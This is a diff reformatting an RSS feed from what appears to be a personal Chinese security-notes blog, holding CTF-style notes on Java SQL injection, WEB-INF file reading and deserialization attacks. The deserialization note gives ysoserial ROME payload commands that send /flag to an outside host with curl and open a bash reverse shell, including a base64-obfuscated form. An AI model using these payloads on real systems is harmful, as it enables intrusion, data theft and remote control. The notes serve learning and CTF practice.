@@ -1,59 +1,33 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>java on Alex lan</title><link>http://localhost:1313/docs/network-security/java/</link><description>Recent content in java on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/network-security/java/index.xml" rel="self" type="application/rss+xml"/><item><title>java sql 注入</title><link>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</guid><description>&lt;h2 id="jdbc-sql注入">
- JDBC sql注入
- &lt;a class="anchor" href="#jdbc-sql%e6%b3%a8%e5%85%a5">#&lt;/a>
-&lt;/h2>
-&lt;p>jdbc类似于url解析&lt;/p>
-&lt;p>输入myapp#&amp;rsquo; union select 1#&lt;/p>
-&lt;pre tabindex="0">&lt;code>jdbc:mysql://mysqldbserver:3360/myapp#&amp;#39; union select 1#
-解析成下面
-jdbc:mysql://mysqldbserver:3360/myapp
-&lt;/code>&lt;/pre>&lt;p>再代入sql语句&lt;/p>
-&lt;pre tabindex="0">&lt;code>select * from user where name=&amp;#39;#&amp;#39; union select 1#&amp;#39; and pwd =&amp;#39;&amp;#34;+pwd+&amp;#34;&amp;#39;
-&lt;/code>&lt;/pre>&lt;p>第一个单引号包裹了，#成了字符串，第二个#注释后面&lt;/p></description></item><item><title>WEB-INF 读取</title><link>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</guid><description>&lt;p>WEB-INF读取&lt;/p>
-&lt;pre tabindex="0">&lt;code>filename=help.docx
-&lt;/code>&lt;/pre>&lt;p>一般来说，出于安全的考虑我们会将网页放在WEB-INF文件下，防止页面直接被访问；&lt;/p>
-&lt;p>这里主要说明，如何通过设置web.xml文件，来访问WEB-INF文件下的网页，&lt;/p>
-&lt;pre tabindex="0">&lt;code>filename=WEB-INF/web.xml
-filename=WEB-INF/classes/struts.xml
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>WEB-INF主要包含一下文件或目录:
-/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
-/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
-/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
-/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
-/WEB-INF/database.properties：数据库配置文件
-漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
-&lt;/code>&lt;/pre>&lt;p>观察其中泄露信息，读取字节码（.class）,在反编译&lt;/p>
-&lt;pre tabindex="0">&lt;code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
-&lt;/code>&lt;/pre>&lt;!-- raw HTML omitted -->
-&lt;!-- raw HTML omitted --></description></item><item><title>反序列化</title><link>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;p>分析序列化后的字符串&lt;/p>
-&lt;p>例子&lt;/p>
-&lt;pre tabindex="0">&lt;code>Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
-&lt;/code>&lt;/pre>&lt;p>作为序列化的标志参考:&lt;/p>
-&lt;p>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。&lt;/p>
-&lt;p>或者如果以aced开头，那么他就是这一段Java序列化的16进制。&lt;/p>
-&lt;h3 id="java-deserialization-scanner">
- java Deserialization Scanner
- &lt;a class="anchor" href="#java-deserialization-scanner">#&lt;/a>
-&lt;/h3>
-&lt;p>这个工具在burp插件里面有，去下载一下，记得初始化插件&lt;/p>
-&lt;p>选中发送到插件里（选中右键-&amp;gt;拓展-&amp;gt;Deserialization-&amp;gt;Send request to DS Manual testing）&lt;/p>
-&lt;p>在Manual Tetsing中用§包裹住字串，不要包裹Brerer&lt;/p>
-&lt;p>下面选择Encode useing Base64，add添加，再选择Encode useing Base64，Attack&lt;/p>
-&lt;p>等待一会，会有提示需要1-3minutes&lt;/p>
-&lt;p>&lt;img src="C:%5cUsers%5cjinchuan%5cOneDrive%5cnotes%5c%e7%bd%91%e5%ae%89%5cjava%5cassets%5cimage-20221229181834551.png" alt="image-20221229181834551" />&lt;/p>
-&lt;p>ROME&lt;/p>
-&lt;p>之后用ysoserial 里的MORE&lt;/p>
-&lt;p>&lt;a href="https://github.com/frohoff/ysoserial">GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/a>&lt;/p>
-&lt;pre tabindex="0">&lt;code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;curl http://vps:10189 -d @/flag&amp;#34; &amp;gt; a.bin
-&lt;/code>&lt;/pre>&lt;p>base64编码&lt;/p>
-&lt;pre tabindex="0">&lt;code>import base64
-with open(&amp;#39;a.bin&amp;#39;,&amp;#39;rb&amp;#39;)as f:
-	b=f.read()
-print(base64.b64encdoe(b))
-&lt;/code>&lt;/pre>&lt;p>放到会执行反序列化的地方取请求,触发命令执行&lt;/p>
-&lt;p>也可以直接shell&lt;/p>
-&lt;pre tabindex="0">&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1
-进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
-
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; &amp;gt; a.bin
-&lt;/code>&lt;/pre>&lt;p>同上base64编码，记得在前面带上Beaere&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>java on Alex lan</title>
+    <link>http://localhost:1313/docs/network-security/java/</link>
+    <description>Recent content in java on Alex lan</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/docs/network-security/java/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>java sql 注入</title>
+      <link>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/</guid>
+      <description>&lt;h2 id=&#34;jdbc-sql注入&#34;&gt;&#xD;&#xA;  JDBC sql注入&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#jdbc-sql%e6%b3%a8%e5%85%a5&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;jdbc类似于url解析&lt;/p&gt;&#xA;&lt;p&gt;输入myapp#&amp;rsquo; union select 1#&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jdbc:mysql://mysqldbserver:3360/myapp#&amp;#39; union select 1#&#xA;解析成下面&#xA;jdbc:mysql://mysqldbserver:3360/myapp&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再代入sql语句&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from user where name=&amp;#39;#&amp;#39; union select 1#&amp;#39; and pwd =&amp;#39;&amp;#34;+pwd+&amp;#34;&amp;#39;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第一个单引号包裹了，#成了字符串，第二个#注释后面&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>WEB-INF 读取</title>
+      <link>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</guid>
+      <description>&lt;p&gt;WEB-INF读取&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;filename=help.docx&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一般来说，出于安全的考虑我们会将网页放在WEB-INF文件下，防止页面直接被访问；&lt;/p&gt;&#xA;&lt;p&gt;这里主要说明，如何通过设置web.xml文件，来访问WEB-INF文件下的网页，&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;filename=WEB-INF/web.xml&#xA;filename=WEB-INF/classes/struts.xml&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;WEB-INF主要包含一下文件或目录:&#xA;/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#xA;/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#xA;/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#xA;/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。&#xA;/WEB-INF/database.properties：数据库配置文件&#xA;漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;观察其中泄露信息，读取字节码（.class）,在反编译&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;!-- raw HTML omitted --&gt;&#xA;&lt;!-- raw HTML omitted --&gt;</description>
+    </item>
+    <item>
+      <title>反序列化</title>
+      <link>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+      <description>&lt;p&gt;分析序列化后的字符串&lt;/p&gt;&#xA;&lt;p&gt;例子&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作为序列化的标志参考:&lt;/p&gt;&#xA;&lt;p&gt;一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。&lt;/p&gt;&#xA;&lt;p&gt;或者如果以aced开头，那么他就是这一段Java序列化的16进制。&lt;/p&gt;&#xA;&lt;h3 id=&#34;java-deserialization-scanner&#34;&gt;&#xD;&#xA;  java Deserialization Scanner&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#java-deserialization-scanner&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&#xD;&#xA;&lt;p&gt;这个工具在burp插件里面有，去下载一下，记得初始化插件&lt;/p&gt;&#xA;&lt;p&gt;选中发送到插件里（选中右键-&amp;gt;拓展-&amp;gt;Deserialization-&amp;gt;Send request to DS Manual testing）&lt;/p&gt;&#xA;&lt;p&gt;在Manual Tetsing中用§包裹住字串，不要包裹Brerer&lt;/p&gt;&#xA;&lt;p&gt;下面选择Encode useing Base64，add添加，再选择Encode useing Base64，Attack&lt;/p&gt;&#xA;&lt;p&gt;等待一会，会有提示需要1-3minutes&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5cjinchuan%5cOneDrive%5cnotes%5c%e7%bd%91%e5%ae%89%5cjava%5cassets%5cimage-20221229181834551.png&#34; alt=&#34;image-20221229181834551&#34; /&gt;&lt;/p&gt;&#xA;&lt;p&gt;ROME&lt;/p&gt;&#xA;&lt;p&gt;之后用ysoserial 里的MORE&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;curl http://vps:10189 -d @/flag&amp;#34; &amp;gt; a.bin&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64编码&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import base64&#xA;with open(&amp;#39;a.bin&amp;#39;,&amp;#39;rb&amp;#39;)as f:&#xA;&#x9;b=f.read()&#xA;print(base64.b64encdoe(b))&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;放到会执行反序列化的地方取请求,触发命令执行&lt;/p&gt;&#xA;&lt;p&gt;也可以直接shell&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1&#xA;进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx&#xA;&#xA;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; &amp;gt; a.bin&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同上base64编码，记得在前面带上Beaere&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
